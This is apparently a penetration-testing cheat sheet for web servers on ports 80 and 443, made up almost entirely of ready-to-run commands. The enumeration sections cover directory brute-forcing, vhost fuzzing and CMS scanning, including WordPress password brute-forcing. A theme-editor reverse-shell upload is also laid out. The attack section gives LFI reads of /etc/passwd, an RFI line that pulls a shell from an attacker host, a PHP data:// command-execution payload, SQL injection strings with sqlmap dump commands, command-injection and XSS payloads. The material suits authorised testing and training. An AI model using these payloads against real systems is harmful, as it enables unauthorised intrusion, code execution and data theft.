# Port 80/443 - HTTP/HTTPS

## Table of Contents
- [Enumeration](#enumeration)
  - [Banner Grabbing](#banner-grabbing)
  - [Nmap Scripts](#nmap-scripts)
  - [Directory Bruteforce](#directory-bruteforce)
  - [Virtual Host Discovery](#virtual-host-discovery)
  - [Technology Detection](#technology-detection)
- [CMS Scanning](#cms-scanning)
  - [WordPress](#wordpress)
  - [Drupal](#drupal)
  - [Joomla](#joomla)
- [Vulnerability Scanning](#vulnerability-scanning)
- [Web Attacks](#web-attacks)

---

## Enumeration

### Quick Check (One-liner)

```shell
curl -sIL http://$rhost | head -20 && whatweb -q http://$rhost && gobuster dir -u http://$rhost -w /usr/share/wordlists/dirb/common.txt -q -t 30
```

### Banner + Tech Detection (One-liner)

```shell
# Quick recon: headers + tech stack
curl -sIL http://$rhost | grep -iE 'server|x-powered|location' && whatweb -q http://$rhost

# Full header analysis
curl -sILk https://$rhost 2>/dev/null | head -30
```

### Nmap Scripts (One-liner)

```shell
# All HTTP enumeration scripts
nmap -p 80,443 -sV --script "http-enum,http-headers,http-methods,http-robots.txt,http-title" $rhost

# Vulnerability scan
nmap -p 80,443 --script "http-vuln-*" $rhost

# SSL/TLS analysis
nmap -p 443 --script "ssl-*" $rhost
```

### Directory Bruteforce (One-liner)

#### gobuster

```shell
# Quick scan with common extensions
gobuster dir -u http://$rhost -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,bak -t 50 -q

# HTTPS with ignore cert
gobuster dir -u https://$rhost -w /usr/share/wordlists/dirb/common.txt -x php,txt -k -t 50 -q
```

#### ffuf

```shell
# Fast fuzzing with filter
ffuf -u http://$rhost/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,301,302,403 -t 100 -c

# With extensions + size filter
ffuf -u http://$rhost/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.txt,.html,.bak -fs 0 -t 100 -c

# Recursive scanning
ffuf -u http://$rhost/FUZZ -w /usr/share/wordlists/dirb/common.txt -recursion -recursion-depth 2 -mc 200,301 -c
```

#### feroxbuster

```shell
# Recursive + auto extensions
feroxbuster -u http://$rhost -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html -d 2 -t 100
```

### Virtual Host Discovery

```shell
# gobuster
gobuster vhost -u http://$rhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# ffuf
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.$domain" -u http://$rhost -ac

# wfuzz
wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.$domain" -u http://$rhost --hc 400,404
```

### Technology Detection

```shell
# Wappalyzer (browser extension)
# WhatWeb
whatweb http://$rhost -v

# Nikto
nikto -host http://$rhost
```

---

## CMS Scanning

### WordPress

```shell
# WPScan basic
wpscan --url http://$rhost

# Enumerate users, themes, plugins
wpscan --url http://$rhost -e u,t,p

# Aggressive plugin detection
wpscan --url http://$rhost --plugins-detection aggressive

# Brute force login
wpscan --url http://$rhost -U users.txt -P passwords.txt

# With API token
wpscan --url http://$rhost --api-token YOUR_API_TOKEN -e vp,vt,u
```

**WordPress Shell Upload:**
```
1. Login to WordPress admin
2. Appearance -> Theme Editor
3. Edit 404.php with PHP reverse shell
4. Access: http://target/wp-content/themes/theme-name/404.php
```

### Drupal

```shell
# droopescan
droopescan scan drupal -u http://$rhost

# Nmap
nmap -p 80,443 --script "http-drupal-enum" $rhost
```

### Joomla

```shell
# droopescan
droopescan scan joomla -u http://$rhost

# joomscan
joomscan -u http://$rhost
```

---

## Vulnerability Scanning

### Nikto

```shell
nikto -host http://$rhost -o nikto.txt
```

### Searchsploit

```shell
# Search for web application exploits
searchsploit apache 2.4
searchsploit wordpress
searchsploit drupal
```

---

## Web Attacks

### File Inclusion

```shell
# Local File Inclusion (LFI)
http://$rhost/page.php?file=../../../../../etc/passwd
http://$rhost/page.php?file=....//....//....//etc/passwd

# Remote File Inclusion (RFI)
http://$rhost/page.php?file=http://$lhost/shell.php

# PHP Wrappers
http://$rhost/page.php?file=php://filter/convert.base64-encode/resource=index.php
http://$rhost/page.php?file=data://text/plain,<?php system($_GET['cmd']);?>
```

### SQL Injection

```shell
# Basic test
' OR '1'='1
" OR "1"="1
' OR 1=1--
" OR 1=1--

# SQLMap
sqlmap -u "http://$rhost/page.php?id=1" --batch
sqlmap -u "http://$rhost/page.php?id=1" --dbs
sqlmap -u "http://$rhost/page.php?id=1" -D database --tables
sqlmap -u "http://$rhost/page.php?id=1" -D database -T table --dump

# With POST data
sqlmap -r request.txt --batch
```

### Command Injection

```shell
# Basic payloads
; id
| id
|| id
& id
&& id
$(id)
`id`
```

### XSS

```shell
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
```

---

## Common Files to Check

```
/robots.txt
/sitemap.xml
/.git/
/.svn/
/.htaccess
/backup/
/admin/
/login/
/phpinfo.php
/server-status
/server-info
```
